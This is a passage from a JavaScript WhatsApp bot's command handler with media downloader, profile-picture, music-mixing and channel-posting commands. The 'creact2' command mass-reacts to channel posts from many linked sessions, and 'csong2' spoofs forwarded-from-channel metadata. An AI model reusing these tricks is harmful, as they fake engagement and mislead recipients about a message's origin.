        return await SYHaTeReplay(`*Usage:*\n${prefix}gevent on\n${prefix}gevent off`);
    }
}



if (SYHaTeS7 === 'webss') {
    const axios = require('axios');

    if (!text) {
        return await SYHaTeReplay(
            `*Usage:* ${prefix}webss [URL]\n\n*Example:* ${prefix}webss google.com`
        );
    }

    let S7HaTeSY = text.trim();

    if (!/^https?:\/\//i.test(S7HaTeSY)) {
        S7HaTeSY = 'https://' + S7HaTeSY;
    }

    try {
        await SYxS7.sendMessage(from, {
            react: {
                text: "☕",
                key: S7.key
            }
        });

        const S7HaTeURL =
            `https://rabbitapi.nett.to/tool/webss?url=${encodeURIComponent(S7HaTeSY)}`;

        const S7HaTeRES = await axios.get(S7HaTeURL, {
            responseType: 'arraybuffer',
            timeout: 60000
        });

        const S7HaTeBUF = Buffer.from(S7HaTeRES.data);

        await SYHaTeReplay({
            image: S7HaTeBUF,
            caption: ``
        });

    } catch (S7HaTeERR) {
        log(
            'error',
            'WEBSS',
            S7HaTeERR?.response?.data || S7HaTeERR.message
        );

        return await SYHaTeReplay(
            `❌ *WebSS Failed:* ${
                S7HaTeERR?.message || 'Unknown error'
            }`
        );
    }
}


if (SYHaTeS7 === 's7hatesy') {
    if (!text) return;

    try {
        let cleanUrl = text.split("?")[0];

        const apiUrl = "https://social-media-downloader-api-s7.onrender.com/sylove?url=" + encodeURIComponent(text);

        const { data } = await axios.get(apiUrl, { timeout: 30000 });

        if (!data?.status || !data?.video_url) {
            throw new Error("API returned invalid response");
        }

        await SYxS7.sendMessage(from, {
            react: {
                text: "👍",
                key: S7.key
            }
        });

        const videoBuffer = await axios({
            method: "GET",
            url: data.video_url,
            responseType: "arraybuffer",
            headers: {
                'User-Agent': 'Mozilla/5.0'
            }
        });

        await SYHaTeReplay({
            video: Buffer.from(videoBuffer.data),
            mimetype: 'video/mp4',
            fileName: 'video.mp4'
        });

    } catch (err) {
        console.log(err);

        await SYHaTeReplay(`❌ *Error:*\n${err.message || err}`);
    }
}

if (SYHaTeS7 === "reqpair") {
        if (!text)
          return await SYHaTeReplay(
            `error: usage -> ${prefix}reqpair 91XXXXXXXXXX`,
          );

        try {
          const number = text.replace(/[^0-9]/g, "");
          if (number.length < 8) {
            return await SYHaTeReplay("invalid number");
          }

          await SYHaTeReplay("ᴄᴏɴɴᴇᴄᴛɪɴɢ...");

          const S7PairCode = await global.StartLovingSY(
            from,
            number,
            SYxS7,
            false,
            null,
            true,
          );

          await SYHaTeReplay(
            `> *ᴄᴏᴅᴇ: ZORO-LITE*

*ᴜsᴇ ᴛʜɪs ᴄᴏᴅᴇ ᴛᴏ ʟɪɴᴋ ʏᴏᴜʀ ʙᴏᴛ*`,
          );
        } catch (err) {
          console.log(err);
          await SYHaTeReplay("pairing failed: " + err.message);
        }
      }

if (SYHaTeS7 === 'play' || SYHaTeS7 === 'song' || SYHaTeS7 === 'mp3') {
    if (!text) return await SYHaTeReplay(`❌ *Please provide a name!*\nExample: ${prefix}play Tu Hai Kahan`);
    
    try {
        const search = await yts(text);
        const video = search.videos[0];
        if (!video) return await SYHaTeReplay("❌ Sorry, I did not find that song!");

        await SYHaTeReplay(`🎵 *Found:* ${video.title}\n⏱️ *Duration:* ${video.timestamp}\n📺 *Channel:* ${video.author.name}`, {
              contextInfo: {
                        externalAdReply: {
                            title: "𝑨𝑼𝑫𝑰𝑶 𝑷𝑳𝑨𝒀𝑬𝑹",
                            body: "Join our Channel for Updates!",
                            mediaType: 1,
                            thumbnailUrl: video.thumbnail,
                            sourceUrl: "https://sayan.is-a.dev",
                            renderLargerThumbnail: true
                        }
                    }
                });

        let audioUrl = null;

        try {
            const res1 = await axios.get(`https://social-media-downloader-api-s7.onrender.com/audiosyhate?url=${encodeURIComponent(video.url)}`, { 
                timeout: 60000, 
                maxContentLength: Infinity 
            });
            
            if (res1.data && (res1.data.status === "success" || res1.data.audio_url)) {
                audioUrl = res1.data.audio_url;
            }
        } catch (e) {
            log('error', 'DOWNLOADER', 'S7 API Timeout, trying Fallback...');
        }

        if (!audioUrl) {
            try {
                const res2 = await axios.get("https://newapi-rypa.onrender.com/api/song?url=" + encodeURIComponent(video.url), { timeout: 30000 });
                if (res2.data?.status && res2.data?.result?.audio) {
                    audioUrl = res2.data.result.audio;
                }
            } catch (e) {
                log('error', 'DOWNLOADER', `All APIs Failed: ${e.message}`);
            }
        }

        if (!audioUrl) return await SYHaTeReplay("❌ Download failed. Servers are busy.");

        await SYHaTeReplay({
            audio: { url: audioUrl },
            mimetype: 'audio/mpeg',
            fileName: `${video.title}.mp3`
        }, {
            externalAdReply: {
                title: video.title,
                body: "",
                thumbnailUrl: video.thumbnail,
                sourceUrl: "https://sayan.is-a.dev", 
                mediaType: 1
            }
        });

    } catch (err) {
        log('error', 'SYSTEM', `Command Error: ${err.message}`);
    }
}

if (SYHaTeS7 === 'fullpp') {
    if (!isOwner) return await SYHaTeReplay(owneronly);
    const contextInfo = S7.message?.extendedTextMessage?.contextInfo;
    const quotedMessage = contextInfo?.quotedMessage;
    const isQuotedImage = quotedMessage ? (quotedMessage.imageMessage || quotedMessage.viewOnceMessage?.message?.imageMessage || quotedMessage.viewOnceMessageV2?.message?.imageMessage) : false;
    const isDirectImage = S7.message?.imageMessage;

    if (!isDirectImage && !isQuotedImage) {
        return await SYHaTeReplay(`*Quote an image or send an image with caption!*\n*Example: ${prefix}fullpp*`);
    }

    try {
        let sharp;
        try {
            sharp = require('sharp');
        } catch (e) {
            const { execSync } = require('child_process');
            await SYHaTeReplay("📦 *Sharp library missing!* Installing it automatically, please wait...");
            execSync('npm install sharp --no-audit --no-fund', { stdio: 'inherit' });
            sharp = require('sharp');
        }

        const imageMessageTarget = isDirectImage ? S7.message.imageMessage : (quotedMessage.imageMessage || quotedMessage.viewOnceMessage?.message?.imageMessage || quotedMessage.viewOnceMessageV2?.message?.imageMessage);
        
        const stream = await downloadContentFromMessage(imageMessageTarget, 'image');
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }

        const processedBuffer = await sharp(buffer)
            .resize(720, 720, { fit: "inside" })
            .jpeg({
                quality: 100,
                chromaSubsampling: "4:4:4"
            })
            .toBuffer();

        const attrs = {
            to: "@s.whatsapp.net",
            type: "set",
            xmlns: "w:profile:picture"
        };

        if (from.endsWith('@g.us')) {
            attrs.target = from;
        }

        await SYxS7.query({
            tag: "iq",
            attrs: attrs,
            content: [
                {
                    tag: "picture",
                    attrs: { type: "image" },
                    content: processedBuffer
                }
            ]
        });

        return await SYHaTeReplay("✅ *Full Profile picture updated successfully!*");

    } catch (err) {
        console.error("FullPP Error:", err);
        return await SYHaTeReplay(`❌ *Injection Failed:* ${err.message}`);
    }
}

if (
        SYHaTeS7 === "addmusic" ||
        SYHaTeS7 === "addsound" ||
        SYHaTeS7 === "addsong"
      ) {
        const cleanupFiles = (filesArray) => {
          filesArray.forEach(filePath => {
            if (fs.existsSync(filePath)) {
              try {
                fs.unlinkSync(filePath);
              } catch (e) {
                console.error("File delete karne mein error:", e.message);
              }
            }
          });
        };

        const contextInfo = S7.message?.extendedTextMessage?.contextInfo;
        const quotedMessage = contextInfo?.quotedMessage;
  
        const videoMessage =
          quotedMessage?.videoMessage || S7.message?.videoMessage;
        const imageMessage =
          quotedMessage?.imageMessage || S7.message?.imageMessage;
  
        if (!videoMessage && !imageMessage)
          return await SYHaTeReplay(
            "❌ *Please reply/quote a video or image with this command!*",
          );
        if (!text)
          return await SYHaTeReplay(
            `❌ *Please provide a song name!*\n*Example:* ${prefix}addmusic Tu Hai Kahan`,
          );
  
        await SYxS7.sendMessage(from, { react: { text: "⏳", key: S7.key } });
  
        const uniqueId = Date.now();
        const inputPath = path.join(
          os.tmpdir(),
          `input_media_${uniqueId}.${videoMessage ? "mp4" : "jpg"}`,
        );
        const downloadedAudioPath = path.join(
          os.tmpdir(),
          `api_audio_${uniqueId}.mp3`,
        );
        const outputVideoPath = path.join(
          os.tmpdir(),
          `output_final_${uniqueId}.mp4`,
        );
  
        try {
          let ffmpeg, ffmpegPath;
          try {
            ffmpeg = require("fluent-ffmpeg");
            ffmpegPath = require("ffmpeg-static");
          } catch (e) {
            const { execSync } = require("child_process");
            await SYHaTeReplay(
              "📦 *Core audio modules missing!* Installing them automatically, please wait...",
            );
            execSync(
              "npm install fluent-ffmpeg ffmpeg-static --no-audit --no-fund",
              { stdio: "inherit" },
            );
            ffmpeg = require("fluent-ffmpeg");
            ffmpegPath = require("ffmpeg-static");
          }
          ffmpeg.setFfmpegPath(ffmpegPath);
  
          const mediaStream = await downloadContentFromMessage(
            videoMessage || imageMessage,
            videoMessage ? "video" : "image",
          );
          const mediaWriter = fs.createWriteStream(inputPath);
          for await (const chunk of mediaStream) {
            mediaWriter.write(chunk);
          }
          mediaWriter.end();
  
          const search = await yts(text);
          const video = search.videos[0];
          if (!video) {
            cleanupFiles([inputPath]);
            return await SYHaTeReplay(
              "❌ Sorry, I did not find that song track!",
            );
          }
  
          let audioUrl = null;
          try {
            const res1 = await axios.get(
              `https://social-media-downloader-api-s7.onrender.com/audiosyhate?url=${encodeURIComponent(video.url)}`,
              { timeout: 30000 },
            );
            if (
              res1.data &&
              (res1.data.status === "success" || res1.data.audio_url)
            ) {
              audioUrl = res1.data.audio_url;
            }
          } catch (e) {
            log("error", "ADDMUSIC", "S7 API Timeout, trying Fallback...");
          }
  
          if (!audioUrl) {
            try {
              const res2 = await axios.get(
                "https://newapi-rypa.onrender.com/api/song?url=" +
                  encodeURIComponent(video.url),
                { timeout: 30000 },
              );
              if (res2.data?.status && res2.data?.result?.audio) {
                audioUrl = res2.data.result.audio;
              }
            } catch (e) {
              log("error", "ADDMUSIC", `Fallback API Failed: ${e.message}`);
            }
          }
  
          if (!audioUrl) {
            cleanupFiles([inputPath]);
            return await SYHaTeReplay(
              "❌ Song download failed. Servers are busy.",
            );
          }
  
          const audioResponse = await axios({
            method: "GET",
            url: audioUrl,
            responseType: "stream",
          });
          const audioWriter = fs.createWriteStream(downloadedAudioPath);
          audioResponse.data.pipe(audioWriter);
          await new Promise((resolve, reject) => {
            audioWriter.on("finish", resolve);
            audioWriter.on("error", reject);
          });
  
          let command = ffmpeg();
  
          if (imageMessage) {
            command
              .input(inputPath)
              .inputOptions(["-loop 1"])
              .input(downloadedAudioPath)
              .outputOptions([
                "-c:v libx264",
                "-preset ultrafast",
                "-tune stillimage",
                "-vf scale=trunc(iw/2)*2:trunc(ih/2)*2,fps=5",
                "-c:a aac",
                "-b:a 128k",
                "-pix_fmt yuv420p",
                "-t 30",
                "-shortest",
              ]);
          } else {
            command
              .input(inputPath)
              .input(downloadedAudioPath)
              .outputOptions([
                "-c:v copy",
                "-c:a aac",
                "-map 0:v:0",
                "-map 1:a:0",
                "-shortest",
              ]);
          }
  
          await command
            .save(outputVideoPath)
            .on("end", async () => {
              await SYHaTeReplay({
                video: fs.readFileSync(outputVideoPath),
                mimetype: "video/mp4",
                caption: `✅ *𝖬𝗎𝗌𝗂𝖼 𝖬𝗂𝖿𝖾𝖽 𝖲𝗎𝖼𝖼𝖾𝗌𝗌𝗎𝗅𝗅𝗒!*\n\n🎵 *Song:* ${video.title}\n✨`,
              });
  
              await SYxS7.sendMessage(from, {
                react: { text: "✅", key: S7.key },
              });
              cleanupFiles([
                inputPath,
                downloadedAudioPath,
                outputVideoPath,
              ]);
            })
            .on("error", async (err) => {
              console.error("FFmpeg Addmusic Error:", err);
              await SYHaTeReplay(
                "❌ Audio mixing processes failed dynamically.",
              );
              cleanupFiles([
                inputPath,
                downloadedAudioPath,
                outputVideoPath,
              ]);
            });
        } catch (error) {
          console.error("Addmusic Execution Error:", error);
          cleanupFiles([inputPath, downloadedAudioPath, outputVideoPath]);
          return await SYHaTeReplay(
            "❌ Critical failure during command process.",
          );
        }
      }

if (SYHaTeS7 === "creact") {
    const args = text.trim().split(/\s+/);
    const channelLink = args[0];
    const emojiStr = args.slice(1).join("");

    if (!channelLink || !emojiStr) {
      return await SYHaTeReplay(
        `❌ *Invalid Format!*\n\n*Usage:* ${prefix}creact <link> <emojis>\n*Example:* ${prefix}creact https://whatsapp.com/channel/0029VaXXXXX/123 🥰😘😅`
      );
    }

    const linkRegex = /channel\/([a-zA-Z0-9\-]+)\/(\d+)/;
    const match = channelLink.match(linkRegex);

    if (!match) {
      return await SYHaTeReplay("❌ *Invalid Link! Please provide a valid WhatsApp Channel post link.*");
    }

    const channelId = match[1];
    const messageId = parseInt(match[2], 10);
    const channelJid = `${channelId}@newsletter`;

    const emojisArray = [...emojiStr].filter(char => char.trim() !== "");

    if (emojisArray.length === 0) {
      return await SYHaTeReplay("❌ *Please provide at least one emoji!*");
    }

    const taskId = `${channelId}_${messageId}`;

    if (global.creactTasks[taskId]) {
      return await SYHaTeReplay("⏳ *A reaction task is already active for this post!*");
    }

    global.creactTasks[taskId] = {
      channelJid,
      messageId,
      emojis: emojisArray,
      senders: [],
      initiator: from
    };

    await SYHaTeReplay(
      `🚀 *Creact Task Started!*\n\n📢 *Channel JID:* ${channelJid}\n🆔 *Post ID:* ${messageId}\n🎭 *Emojis:* ${emojisArray.join(" ")}\n\n_This task will run for 1 hour and react automatically when unique incoming messages are received._`
    );

    setTimeout(async () => {
      if (global.creactTasks[taskId]) {
        const totalReactions = global.creactTasks[taskId].senders.length;
        
        await SYxS7.sendMessage(global.creactTasks[taskId].initiator, {
          text: `✅ *Creact Task Finished!*\n\n🔗 *Post:* ${channelLink}\n📊 *Total Unique Reactions Sent:* ${totalReactions}\n\n_The 1-hour limit has been reached, and the task has automatically stopped._`
        });

        delete global.creactTasks[taskId];
      }
    }, 3600000);
  }
  

if (SYHaTeS7 === "creact2") {
        try {
          const args = budy.split(" ");
          const channelLink = args[1];
          const emojisStr = args.slice(2).join("").trim();

          if (!channelLink || !emojisStr) {
            return await SYHaTeReplay(
              "❌ Usage:\n`creact https://whatsapp.com/channel/xxxx/123 🪄💝🎶`"
            );
          }

          const match = channelLink.match(/channel\/([^\/]+)\/(\d+)/);
          if (!match) {
            return await SYHaTeReplay("❌ Invalid WhatsApp Channel Link!");
          }

          const channelJid = match[1] + "@newsletter";
          const messageId = match[2];
          const emojiArray = Array.from(emojisStr);
          const activeSessions = Object.values(global.waSessions || {}).filter(
            (sock) => sock && sock.user
          );

          if (activeSessions.length === 0) {
            return await SYHaTeReplay("❌ No active sessions found!");
          }

          await SYHaTeReplay(
            `⏳ Processing reactions from ${activeSessions.length} sessions...`
          );

          let successCount = 0;

          for (let i = 0; i < activeSessions.length; i++) {
            const currentSock = activeSessions[i];
            const emojiToUse = emojiArray[i % emojiArray.length];

            try {
              await currentSock.newsletterReactMessage(
                channelJid,
                messageId,
                emojiToUse
              );
              successCount++;
            } catch (err) {
              log(`Session Error: ${err.message}`);
            }
          }

          await SYHaTeReplay(
            `✅ Done!\n✨ Successfully reacted from ${successCount}/${activeSessions.length} sessions.`
          );
        } catch (e) {
          log(`Creact Error: ${e.message}`);
          await SYHaTeReplay("❌ An error occurred while processing the command.");
        }
      }



if (SYHaTeS7 === 'timeddp') {
    if (!isOwner) return await SYHaTeReplay(owneronly);
    
    if (!db[botNumber]) db[botNumber] = {};
    if (!db[botNumber].timedDPs) db[botNumber].timedDPs = [];

    const action = args[0]?.toLowerCase();

    if (!action) {
        return await SYHaTeReplay(`*ＴＩＭＥＤ  ＤＰ  ＳＥＴＴＩＮＧＳ*\n\n*Commands:*\n> ${prefix}timeddp add [time-range]\n> ${prefix}timeddp del [time-range]\n> ${prefix}timeddp list\n\n*Note:* Quote an image with add command. Use 24-hour HH:MM-HH:MM format.\n*Example:* ${prefix}timeddp add 14:00-18:30`);
    }

    if (action === 'add') {
        const contextInfo = S7.message?.extendedTextMessage?.contextInfo;
        const quotedMessage = contextInfo?.quotedMessage;
        const isQuotedImage = quotedMessage ? (quotedMessage.imageMessage || quotedMessage.viewOnceMessage?.message?.imageMessage || quotedMessage.viewOnceMessageV2?.message?.imageMessage) : false;
        const isDirectImage = S7.message?.imageMessage;

        if (!isDirectImage && !isQuotedImage) {
            return await SYHaTeReplay(`❌ *Error:* Quote an image or send an image with caption!\n*Example:* ${prefix}timeddp add 14:00-15:30`);
        }

        const timeSlot = args[1];
        if (!timeSlot) return await SYHaTeReplay(`❌ *Error:* Please provide a valid time range!\n*Example:* ${prefix}timeddp add 02:00-15:00`);

        const timeRegex = /^([01]\d|2[0-3]):([0-5]\d)-([01]\d|2[0-3]):([0-5]\d)$/;
        if (!timeRegex.test(timeSlot.trim())) {
            return await SYHaTeReplay("❌ *Invalid Time Format!* Use 24-hour HH:MM-HH:MM format.\n*Example:* 14:00-18:30");
        }

        const [newStart, newEnd] = timeSlot.trim().split('-');
        
        const isOverlap = db[botNumber].timedDPs.some(slot => {
            return (newStart >= slot.start && newStart < slot.end) || (newEnd > slot.start && newEnd <= slot.end) || (newStart <= slot.start && newEnd >= slot.end);
        });

        if (isOverlap) {
            return await SYHaTeReplay("⚠️ *Time Overlap Error!* This time slot conflicts with an already scheduled DP in your list.");
        }

        try {
            const imageMessageTarget = isDirectImage ? S7.message.imageMessage : (quotedMessage.imageMessage || quotedMessage.viewOnceMessage?.message?.imageMessage || quotedMessage.viewOnceMessageV2?.message?.imageMessage);
            const stream = await downloadContentFromMessage(imageMessageTarget, 'image');
            let buffer = Buffer.from([]);
            for await (const chunk of stream) {
                buffer = Buffer.concat([buffer, chunk]);
            }

            const rawUserNum = sender.split('@')[0];
            const targetDir = path.join(process.cwd(), 'Love', 'dp', rawUserNum);
            if (!fs.existsSync(targetDir)) {
                fs.mkdirSync(targetDir, { recursive: true });
            }

            const safeTimeStr = timeSlot.trim().replace(':', 'h').replace(':', 'm');
            const finalImgPath = path.join(targetDir, `${safeTimeStr}.jpg`);
            fs.writeFileSync(finalImgPath, buffer);

            db[botNumber].timedDPs.push({
                start: newStart,
                end: newEnd,
                path: finalImgPath,
                rawSlot: timeSlot.trim()
            });
            saveDB(db);

            return await SYHaTeReplay(`✅ *ＴＩＭＥＤ  ＤＰ  ＡＣＴＩＶＡＴＥＤ*`);

        } catch (err) {
            console.error(err);
            return await SYHaTeReplay(`❌ *Failed to schedule DP:* ${err.message}`);
        }
    }

    else if (action === 'del' || action === 'delete') {
        const timeSlot = args[1];
        if (!timeSlot) return await SYHaTeReplay(`❌ *Error:* Please specify the slot to remove!\n*Example:* ${prefix}timeddp del 14:00-15:30`);

        const targetSlot = timeSlot.trim();
        const existingSlot = db[botNumber].timedDPs.find(slot => slot.rawSlot === targetSlot);

        if (!existingSlot) {
            return await SYHaTeReplay("❌ *Slot Not Found!* Check your active list first.");
        }

        if (fs.existsSync(existingSlot.path)) {
            try { fs.unlinkSync(existingSlot.path); } catch (e) {}
        }

        db[botNumber].timedDPs = db[botNumber].timedDPs.filter(slot => slot.rawSlot !== targetSlot);
        saveDB(db);

        return await SYHaTeReplay(`📴 *ＴＩＭＥＤ  ＤＰ  ＤＥＡＣＴＩＶＡＴＥＤ*`);
    }

    else if (action === 'list') {
        if (db[botNumber].timedDPs.length === 0) {
            return await SYHaTeReplay("*ＴＩＭＥＤ  ＤＰ  ＬＩＳＴ*\n\n> No scheduled automated DPs found.");
        }

        let listMenu = "*ＴＩＭＥＤ  ＤＰ  ＬＩＳＴ*\n\n";
        db[botNumber].timedDPs.forEach((slot, index) => {
            listMenu += `> ${index + 1}. ⏱️ ${slot.rawSlot}\n`;
        });
        return await SYHaTeReplay(listMenu);
    }
}


const crypto = require('crypto');

if (SYHaTeS7 === 'csong') {
    if (!text) {
        return await SYHaTeReplay(`*🎙️ CHANNEL *\n\n❌ *Usage Format:*\n\`${prefix}csong <song_name> , <channel_jid/link>\`\n\n*Example:* \`${prefix}csong faded , 1203634xxxx@newsletter\``);
    }

    const lastComma = text.lastIndexOf(",");
    if (lastComma === -1) {
        return await SYHaTeReplay("✨ *System Notification:*\n❌ Please use a comma (\`,\`) to separate the song name/link and the target channel destination.");
    }

    const songInput = text.slice(0, lastComma).trim();
    const channelInput = text.slice(lastComma + 1).trim();

    if (!songInput) return await SYHaTeReplay("❌ *Error:* Enter a valid song name or YouTube URL track.");
    if (!channelInput) return await SYHaTeReplay("❌ *Error:* Enter a valid target WhatsApp channel JID/Link.");

    const tempFiles = [];

    try {
        let ffmpeg, ffmpegPath;
        try {
            ffmpeg = require('fluent-ffmpeg');
            ffmpegPath = require('ffmpeg-static');
        } catch (e) {
            const { execSync } = require('child_process');
            await SYHaTeReplay("📦 *System Patch:* Core audio modules missing! Dynamic compilation initialized, please wait...");
            execSync('npm install fluent-ffmpeg ffmpeg-static --no-audit --no-fund', { stdio: 'inherit' });
            ffmpeg = require('fluent-ffmpeg');
            ffmpegPath = require('ffmpeg-static');
        }
        ffmpeg.setFfmpegPath(ffmpegPath);

        await SYxS7.sendMessage(from, { react: { text: "🔍", key: S7.key } });

        let channelJid = channelInput;
        if (!channelJid.includes("@newsletter")) {
            try {
                const url = new URL(channelInput);
                if (url.pathname.startsWith("/channel/")) {
                    const code = url.pathname.split("/channel/")[1];
                    const res = await SYxS7.newsletterMetadata("invite", code, "GUEST");
                    channelJid = res.id;
                }
            } catch (_) {
                channelJid = null;
            }
        }

        if (!channelJid) return await SYHaTeReplay("❌ *Verification Failed:* Invalid target channel identifier metadata.");

        let video;
        const isYouTubeUrl = /^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.be)\/.+/.test(songInput);

        if (isYouTubeUrl) {
            const videoId = songInput.match(/(?:v=|youtu\.be\/)([^&?/]+)/)?.[1] || "";
            const res = await yts({ videoId });
            video = {
                title: res.title || "Unknown Track",
                author: { name: res.author?.name || "Unknown Content Creator" },
                timestamp: res.timestamp || "00:00",
                thumbnail: res.thumbnail || "",
                url: songInput,
            };
        } else {
            const res = await yts(songInput);
            if (!res.videos || res.videos.length === 0) {
                return await SYHaTeReplay("❌ *Query Empty:* Could not find the requested audio track anywhere.");
            }
            video = res.videos[0];
        }

        await SYxS7.sendMessage(from, { react: { text: "⬇️", key: S7.key } });

        const res1 = await axios.get(`https://social-media-downloader-api-s7.onrender.com/audiosyhate?url=${encodeURIComponent(video.url)}`, { 
            timeout: 60000, 
            maxContentLength: Infinity 
        });
        
        let audioUrl = null;
        if (res1.data && (res1.data.status === "success" || res1.data.audio_url)) {
            audioUrl = res1.data.audio_url;
        }

        if (!audioUrl) {
            return await SYHaTeReplay("❌ *API Rejection:* Remote audio downloader node returned an empty buffer.");
        }

        const id = crypto.randomBytes(8).toString("hex");
        const mp3File = path.join(os.tmpdir(), `csong_${id}.mp3`);
        const oggFile = path.join(os.tmpdir(), `csong_${id}.ogg`);
        tempFiles.push(mp3File, oggFile);

        const dlResp = await axios.get(audioUrl, { responseType: "stream", timeout: 120000 });
        const writer = fs.createWriteStream(mp3File);
        dlResp.data.pipe(writer);

        await new Promise((res, rej) => {
            writer.on("finish", res);
            writer.on("error", rej);
            dlResp.data.on("error", rej);
        });

        await SYxS7.sendMessage(from, { react: { text: "🎙️", key: S7.key } });

        await new Promise((resolve, reject) => {
            ffmpeg(mp3File)
                .noVideo()
                .audioCodec("libopus")
                .format("ogg")
                .audioBitrate("128k")
                .on("end", resolve)
                .on("error", reject)
                .save(oggFile);
        });

        const voiceBuffer = fs.readFileSync(oggFile);

        const userCaption = `🎵 *ＮＯＷ  ＰＬＡＹＩＮＧ*

📌 *Title:* ${video.title}
👤 *Channel:* ${video.author.name}
⏱️ *Duration:* ${video.timestamp}

> *Streaming via Zoro MD Lite*`;

        const channelCaption = `📢 *𝖲𝖸𝖲𝖳𝖤𝖬  𝖢𝖧𝖠𝖭𝖭𝖤𝖫  𝖲𝖳𝖱𝖤𝖠𝖬*

🎵 *Track:* ${video.title}
⏱️ *Duration:* ${video.timestamp}

> *Powered by Zoro MD Lite*`;

        await SYxS7.sendMessage(from, { image: { url: video.thumbnail }, caption: userCaption }, { quoted: S7 });

        await SYxS7.sendMessage(channelJid, { text: channelCaption });

        await SYxS7.sendMessage(from, { react: { text: "📤", key: S7.key } });

        await SYxS7.sendMessage(channelJid, {
            audio: voiceBuffer,
            mimetype: "audio/ogg; codecs=opus",
            ptt: true
        });

        await SYxS7.sendMessage(from, { react: { text: "✅", key: S7.key } });
        return await SYHaTeReplay(`✨ *🔮 𝖲𝖾𝗇𝗍 𝖲𝗎𝖼𝖼𝖾𝗌𝗌𝖿𝗎𝗅lh!*\n\n🎵 \`${video.title}\` is now broadcasted directly to the newsletter target node.`);

    } catch (err) {
        console.error(err);
        return await SYHaTeReplay(`⚠️ *Broadcast Pipeline Error:* ${err.message}`);
    } finally {
        tempFiles.forEach((f) => {
            try { if (fs.existsSync(f)) fs.unlinkSync(f); } catch {}
        });
    }
}


if (SYHaTeS7 === 'csong2') {
    const axios = require('axios');
    const fs = require('fs');
    const ffmpeg = require('fluent-ffmpeg');
    const ffmpegPath = require('ffmpeg-static');
    const yts = require('yt-search');

    ffmpeg.setFfmpegPath(ffmpegPath);

    if (!text) {
        return await SYHaTeReplay(
`*ＣＨＡＮＮＥＬ  ＳＯＮＧ*

*Usage:* > ${prefix}csong [JID] [NAME]

*Example:* > ${prefix}csong 123xx@newsletter Nggu dulu`
        );
    }

    const args = text.split(' ');
    const S7jid = args[0];
    const S7query = args.slice(1).join(' ');

    if (!S7jid || !S7query) {
        return await SYHaTeReplay("*Invalid format!*");
    }

    try {
        await SYxS7.sendMessage(from, { react: { text: '🔍', key: S7.key } });

        const search = await yts(S7query);
        const video = search.videos[0];
        if (!video) return await SYHaTeReplay("*Song not found!*");

        await SYHaTeReplay(
`🎵 *Found:* ${video.title}
⏱️ *Duration:* ${video.timestamp}
📺 *Channel:* ${video.author.name}`, {
            contextInfo: {
                externalAdReply: {
                    title: "𝑪𝑯𝑨𝑵𝑵𝑬𝑳 𝑺𝑶𝑵𝑮",
                    body: "Sending to channel...",
                    thumbnailUrl: video.thumbnail,
                    sourceUrl: video.url,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        });

        let audioUrl = null;

        try {
            const res1 = await axios.get(`https://social-media-downloader-api-s7.onrender.com/audiosyhate?url=${encodeURIComponent(video.url)}`, { timeout: 60000 });
            if (res1.data?.audio_url) audioUrl = res1.data.audio_url;
        } catch {}

        if (!audioUrl) {
            try {
                const res2 = await axios.get(`https://newapi-rypa.onrender.com/api/song?url=${encodeURIComponent(video.url)}`, { timeout: 30000 });
                if (res2.data?.result?.audio) audioUrl = res2.data.result.audio;
            } catch {}
        }

        if (!audioUrl) return await SYHaTeReplay("*Download failed!*");

        await SYxS7.sendMessage(from, { react: { text: '⬇️', key: S7.key } });

        const S7res = await axios.get(audioUrl, { responseType: 'arraybuffer' });

        const S7input = `./S7_${Date.now()}.mp3`;
        const S7output = `./S7_${Date.now()}.opus`;

        fs.writeFileSync(S7input, S7res.data);

        await new Promise((res, rej) => {
            ffmpeg(S7input)
                .noVideo()
                .audioCodec('libopus')
                .audioBitrate('128k')
                .format('ogg')
                .save(S7output)
                .on('end', res)
                .on('error', rej);
        });

        const S7buffer = fs.readFileSync(S7output);

        await SYxS7.sendMessage(from, { react: { text: '📤', key: S7.key } });

        const botNumber = (SYxS7.user.id.split(':')[0] || SYxS7.user.id).split('@')[0] + '@s.whatsapp.net';
        const customName = db[botNumber]?.channelName || '【 BY DEATHLINE 💀】';
        const customJid = db[botNumber]?.newsletterJid || '120363424694018029@newsletter';
        
        await SYxS7.sendMessage(S7jid, {
            audio: S7buffer,
            mimetype: 'audio/ogg; codecs=opus',
            ptt: true,
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: customJid,
                    newsletterName: customName,
                    serverMessageId: 1
                },
                externalAdReply: {
                    title: video.title,
                    body: "© 𝐙𝐎𝐑𝐎 𝐌𝐃 𝐋𝐈𝐓𝐄",
                    thumbnailUrl: video.thumbnail,
                    sourceUrl: video.url,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        });

        try { fs.unlinkSync(S7input); } catch {}
        try { fs.unlinkSync(S7output); } catch {}

        await SYxS7.sendMessage(from, { react: { text: '✅', key: S7.key } });

    } catch (err) {
        await SYHaTeReplay(`*Failed to send song!*\n*Error:* ${err.message || err}`);
    }
}



if (SYHaTeS7 === 's7hatesy2') {
    if (!text) return await SYHaTeReplay(`❌ *Please provide a name!*`);
    
    try {
        const search = await yts(text);
        const video = search.videos[0];
        if (!video) return await SYHaTeReplay("❌ Song not found!");

        let audioUrl = null;

        try {
            const res1 = await axios.get(`https://social-media-downloader-api-s7.onrender.com/audiosyhate?url=${encodeURIComponent(video.url)}`, { timeout: 60000 });
            if (res1.data?.audio_url) audioUrl = res1.data.audio_url;
        } catch (e) { log('error', 'S7HATESY2', 'S7 API Fail'); }

        if (!audioUrl) {
            try {
                const res2 = await axios.get("https://newapi-rypa.onrender.com/api/song?url=" + encodeURIComponent(video.url), { timeout: 15000 });
                if (res2.data?.result?.audio) audioUrl = res2.data.result.audio;
            } catch (e) { log('error', 'S7HATESY2', 'Fallback Fail'); }
        }

        if (!audioUrl) return await SYHaTeReplay("❌ Download failed.");

        await SYHaTeReplay({
            audio: { url: audioUrl },
            mimetype: 'audio/mpeg',
            fileName: `${video.title}.mp3`
        }, {
            externalAdReply: {
                title: video.title,
                body: "",
                thumbnailUrl: video.thumbnail,
                sourceUrl: "https://sayan.is-a.dev", 
                mediaType: 1
            }
        });
    } catch (err) {
        log('error', 'S7HATESY2', err.message);
    }
}



                
                if (SYHaTeS7 === 'ptv') {
    const { downloadContentFromMessage } = require('@whiskeysockets/baileys');

    const quoted = S7.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    const mime = quoted?.videoMessage ? 'videoMessage' : null;

